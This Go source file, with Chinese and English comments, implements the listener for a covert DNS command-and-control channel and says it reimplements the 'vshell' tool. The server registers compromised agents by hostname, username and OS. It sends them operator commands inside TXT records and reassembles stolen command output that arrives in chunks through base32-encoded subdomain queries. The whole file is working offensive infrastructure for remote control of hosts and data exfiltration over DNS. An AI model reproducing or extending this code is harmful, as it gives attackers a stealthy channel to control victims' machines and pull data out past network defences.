// Package c2engine/dns 实现基于 DNS 查询的隐蔽 C2 信道。
// Package c2engine/dns implements a covert DNS-based C2 channel.
package c2engine

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// ============================================================================
// DNS C2 Listener - covert channel via DNS queries
// DNS C2 监听器——通过 DNS 查询的隐蔽信道
// ============================================================================
//
// The original vshell binary supports DNS as a C2 transport mode.
// Agents encode data in DNS subdomain queries like:
//   <base64_data>.<agent_id>.c2.example.com
//
// The server responds with encoded data in TXT records.
// 原版 vshell 支持 DNS 作为 C2 传输模式：Agent 将数据编码进 DNS 子域查询
// （<base64_data>.<agent_id>.c2.example.com），服务器以 TXT 记录返回编码数据。

// DNSListener 实现隐蔽 DNS C2 信道。
// DNSListener implements a covert DNS C2 channel.
type DNSListener struct {
	mu          sync.RWMutex
	ID          int64
	Domain      string   // e.g., "c2.example.com"
	PublicDNS   string   // Public DNS server to use for resolution
	MaxSize     int      // Max DNS message size
	ListenAddr  string   // UDP 监听地址（空则 :53 → :5353 回退）
	VerifyKey   string
	listener    net.PacketConn
	isRunning   bool
	stopCh      chan struct{}

	// Pending messages for agents (agentID -> message queue)
	pendingOut map[string][]string
	pendingMu  sync.RWMutex

	// 分片结果累积：key = "<agentID>:<taskID>"，value = 已收到的分片。
	// DNS 查询的域名总长上限 255 字节，长结果必须分批上传（见 result 分支）。
	resultParts map[string][][]byte
	resultMu    sync.Mutex
}

// NewDNSListener 创建新的 DNS C2 监听器。
// NewDNSListener creates a new DNS C2 listener.
func NewDNSListener(id int64, domain, publicDNS, verifyKey string, maxSize int, listenAddr string) *DNSListener {
	if maxSize <= 0 {
		maxSize = 512
	}
	return &DNSListener{
		ID:         id,
		Domain:     strings.TrimSuffix(strings.TrimPrefix(domain, "."), "."),
		PublicDNS:  publicDNS,
		MaxSize:    maxSize,
		ListenAddr: listenAddr,
		VerifyKey:  verifyKey,
		pendingOut:  make(map[string][]string),
		resultParts: make(map[string][][]byte),
		stopCh:      make(chan struct{}),
	}
}

// Start 开始监听 DNS 查询。
// Start begins listening for DNS queries.
func (dl *DNSListener) Start() error {
	dl.mu.Lock()
	defer dl.mu.Unlock()

	if dl.isRunning {
		return fmt.Errorf("DNS listener %d already running", dl.ID)
	}

	// 监听地址优先用监听器配置（原版的 DNS 监听地址由面板/配置给出）；
	// 未配置时按 53 → 5353 顺序尝试。
	addr := dl.ListenAddr
	if addr == "" {
		addr = ":53"
	}
	conn, err := net.ListenPacket("udp", addr)
	if err != nil && dl.ListenAddr == "" {
		conn, err = net.ListenPacket("udp", ":5353")
		if err == nil {
			addr = ":5353"
		}
	}
	if err != nil {
		return fmt.Errorf("failed to bind DNS listener on %s: %w", addr, err)
	}
	dl.listener = conn
	dl.isRunning = true

	go dl.serve(conn)
	log.Printf("[DNS Listener %d] Started on %s (domain %s)", dl.ID, addr, dl.Domain)
	return nil
}

func (dl *DNSListener) serve(conn net.PacketConn) {
	buf := make([]byte, 1500) // Max UDP DNS size
	for {
		select {
		case <-dl.stopCh:
			return
		default:
		}

		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, addr, err := conn.ReadFrom(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			continue
		}

		// Copy the datagram: buf is reused by the next ReadFrom while handler
		// goroutines are still decoding the aliased slice, so passing buf[:n]
		// directly races concurrent queries against each other.
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go dl.handleDNSQuery(pkt, addr)
	}
}

func (dl *DNSListener) handleDNSQuery(data []byte, addr net.Addr) {
	var msg dns.Msg
	if err := msg.Unpack(data); err != nil {
		return
	}

	if len(msg.Question) == 0 {
		return
	}

	question := msg.Question[0]
	// DNS 问题名是 FQDN（结尾带点），比较域名后缀前必须先去掉尾点，
	// 否则 "abc.c2.e2e.test." 永远匹配不上记录里配置的 "c2.e2e.test"。
	domain := strings.TrimSuffix(strings.ToLower(question.Name), ".")
	zone := strings.TrimSuffix(strings.ToLower(dl.Domain), ".")

	// Check if this query is for our C2 domain
	if zone != "" && !strings.HasSuffix(domain, zone) {
		return
	}

	// Extract encoded data from subdomain: <base32>.<zone>
	subdomain := domain
	if zone != "" {
		subdomain = strings.TrimSuffix(strings.TrimSuffix(domain, zone), ".")
	}

	// 查询侧可能被拆成多个标签（单标签上限 63 字符，长消息必须分块）：
	// 按顺序拼回整串再解 base32。单标签查询（短消息）同样适用。
	parts := strings.Split(subdomain, ".")
	encodedData := strings.Join(parts, "")

	// Decode the base32 label.
	decoded, err := dl.decodeData(encodedData)
	if err != nil {
		log.Printf("[DNS %d] Failed to decode data from %s: %v", dl.ID, addr.String(), err)
		return
	}

	// 信道布局（对齐 RE 结论 E-08）：标签 = base32([8B agentID 大端][消息])。
	// agentID=0 表示"尚未分配"，由 checkin 分支回填。
	// 兼容早期形态：不足 8 字节时退化为"最后一节标签 = agentID"。
	agentID := "unknown"
	payload := decoded
	if len(decoded) >= 8 {
		id := binary.BigEndian.Uint64(decoded[:8])
		agentID = fmt.Sprintf("%d", id)
		payload = decoded[8:]
	} else if len(parts) > 1 {
		agentID = parts[len(parts)-1]
	}

	// Process the C2 message
	response := dl.processMessage(agentID, string(payload), addr.String())

	// Send response via DNS TXT record
	if response != "" {
		dl.sendDNSResponse(dl.listener, addr, msg, response)
	}
}

func (dl *DNSListener) decodeData(data string) ([]byte, error) {
	// 黑盒实锤（session 171-174）：DNS 标签 = Go 标准 base32
	// （日志 "NXDOMAIN: base32 decoding: illegal base32 data"）。
	// "testvkey" 标签 → base32 解码 → 5 字节（长度检查源）。
	return base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(data))
}

func (dl *DNSListener) encodeData(data string) string {
	// 原版 DNS 编码 = base32（Go 标准字母表 ABC...234567，无填充）
	return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(data))
}

func (dl *DNSListener) processMessage(agentID, data, remoteAddr string) string {
	engine := GetEngine()

	// Parse the message
	msgType, payload := dl.parseDNSMessage(data)

	switch msgType {
	case "checkin":
		// Agent registration via DNS
		parts := strings.Split(payload, "|")
		hostname := ""
		username := ""
		osName := ""
		if len(parts) > 0 {
			hostname = parts[0]
		}
		if len(parts) > 1 {
			username = parts[1]
		}
		if len(parts) > 2 {
			osName = parts[2]
		}

		// DNS 注册载荷是 "hostname|username|osname" 三段，不带架构字段（原版
		// DNS 通道的注册串同样只到这里），因此 Arch 留空。
		client, err := engine.NewClient(
			dl.VerifyKey,
			"dns",
			remoteAddr,
			"",
			username,
			hostname,
			osName,
			"dns_agent",
			"",
		)
		if err != nil {
			return "err:register_failed"
		}

		Logf("DNS %d: agent %d checked in (%s@%s)", dl.ID, client.ID, username, hostname)
		interval := 10
		if l := engine.GetListener(dl.ID); l != nil && l.PingInterval > 0 {
			interval = l.PingInterval
		}
		return fmt.Sprintf("ok:%d:%d", client.ID, interval) // client_id:poll_interval

	case "task":
		// Agent polling for tasks
		var clientID int64
		fmt.Sscanf(agentID, "%d", &clientID)

		// Update client
		if client := engine.GetClient(clientID); client != nil {
			client.UpdateSeen()
		}

		// 原子领取一条待处理任务（与 HTTP/KCP 通道一致，避免重复下发）。
		if pending := engine.GetAndMarkPendingTasks(clientID); len(pending) > 0 {
			task := pending[0]
			// 未领取的剩余任务放回（GetAndMarkPendingTasks 已全部标记，
			// DNS 一次只能送一条，其余标记为 pending 以便下轮再取）。
			for _, rest := range pending[1:] {
				rest.Status = "pending"
			}
			Logf("DNS %d: dispatch task %d to client %d", dl.ID, task.ID, clientID)
			return fmt.Sprintf("task:%d:%s", task.ID, dl.encodeData(task.Command))
		}

		return "noop"

	case "result":
		// 结果上报。两种形态：
		//   "result:<taskID>:<数据>"                      —— 短结果（兼容旧客户端）
		//   "result:<taskID>:<seq>/<total>:<b64 分片>"    —— 长结果分片上传
		// DNS 单次查询的域名总长 ≤255 字节，长输出（id/ps 之类）必须分片。
		Logf("DNS %d: result chunk from agent %q (%d bytes)", dl.ID, agentID, len(payload))
		parts := strings.SplitN(payload, ":", 3)
		if len(parts) < 2 {
			return "ack"
		}
		var taskID int64
		fmt.Sscanf(parts[0], "%d", &taskID)

		if len(parts) == 2 || !strings.Contains(parts[1], "/") {
			// 短结果：整体就是数据。
			data := strings.Join(parts[1:], ":")
			engine.UpdateTask(taskID, data, "completed")
			return "ack"
		}

		// 分片：seq/total:b64
		var seq, total int
		fmt.Sscanf(parts[1], "%d/%d", &seq, &total)
		chunk, derr := base64.StdEncoding.DecodeString(parts[2])
		if derr != nil || seq < 1 || total < 1 || seq > total {
			return "ack"
		}
		key := fmt.Sprintf("%s:%d", agentID, taskID)
		dl.resultMu.Lock()
		buf := dl.resultParts[key]
		if len(buf) != total {
			buf = make([][]byte, total)
			dl.resultParts[key] = buf
		}
		buf[seq-1] = chunk
		complete := true
		for _, b := range buf {
			if b == nil {
				complete = false
				break
			}
		}
		var joined []byte
		if complete {
			for _, b := range buf {
				joined = append(joined, b...)
			}
			delete(dl.resultParts, key)
		}
		dl.resultMu.Unlock()

		if complete {
			engine.UpdateTask(taskID, string(joined), "completed")
			Logf("DNS %d: task %d completed via %d chunk(s), %d bytes", dl.ID, taskID, total, len(joined))
		}
		return "ack"

	default:
		return "noop"
	}
}

func (dl *DNSListener) parseDNSMessage(data string) (msgType string, payload string) {
	parts := strings.SplitN(data, ":", 2)
	if len(parts) == 2 {
		return parts[0], parts[1]
	}
	// 无冒号 = 无载荷的命令（"task" 轮询就是这种形态）。此前这里返回
	// "unknown"，导致 DNS 通道永远取不到任务。
	if cmd := strings.TrimSpace(data); cmd != "" {
		return cmd, ""
	}
	return "unknown", data
}

func (dl *DNSListener) sendDNSResponse(conn net.PacketConn, addr net.Addr, query dns.Msg, response string) {
	// Build DNS response
	resp := new(dns.Msg)
	resp.SetReply(&query)
	resp.Authoritative = true

	// Encode response in TXT records
	// Split into chunks that fit in DNS labels (63 chars max per label)
	encoded := dl.encodeData(response)
	chunks := splitDNSChunks(encoded, 60)

	for _, chunk := range chunks {
		resp.Answer = append(resp.Answer, &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   query.Question[0].Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    60,
			},
			Txt: []string{chunk},
		})
	}

	packed, err := resp.Pack()
	if err != nil {
		return
	}

	conn.WriteTo(packed, addr)
}

func splitDNSChunks(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

// Stop 优雅停止 DNS 监听器。
// Stop gracefully stops the DNS listener.
func (dl *DNSListener) Stop() error {
	dl.mu.Lock()
	defer dl.mu.Unlock()

	if !dl.isRunning {
		return nil
	}

	close(dl.stopCh)
	if dl.listener != nil {
		dl.listener.Close()
	}
	dl.isRunning = false
	log.Printf("[DNS Listener %d] Stopped", dl.ID)
	return nil
}

// IsRunning 返回监听器是否活跃。
// IsRunning returns whether the listener is active.
func (dl *DNSListener) IsRunning() bool {
	dl.mu.RLock()
	defer dl.mu.RUnlock()
	return dl.isRunning
}


